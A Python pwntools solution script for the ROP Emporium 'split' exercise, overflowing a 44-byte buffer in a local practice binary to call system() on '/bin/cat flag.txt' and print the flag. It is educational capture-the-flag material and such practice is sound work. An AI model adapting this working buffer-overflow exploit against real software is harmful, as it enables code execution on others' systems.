#!/usr/bin/env python3

"""
Solution for ROP Emporium level 2: split
"""

from pwn import *

"""
cat flag: 0x804a030 '/bin/cat flag.txt'
call system: 0x0804861a <+14>:    call   0x80483e0 <system@plt>

1. Fill the buffer with 44 bytes of junk
2. Address of call system
3. Address of cat flag
"""

context.log_level = "debug"
io = process("./split32")

offset = 44

io.recvuntil(b"> ")

payload = b""
payload += b"A" * offset
payload += p32(0x0804861a)      # call system()
payload += p32(0x0804a030)      # /bin/cat flag.txt

print(str(payload))

io.sendline(payload)
io.recvuntil(b"Thank you!\n")
flag = io.recv()
success(str(flag))
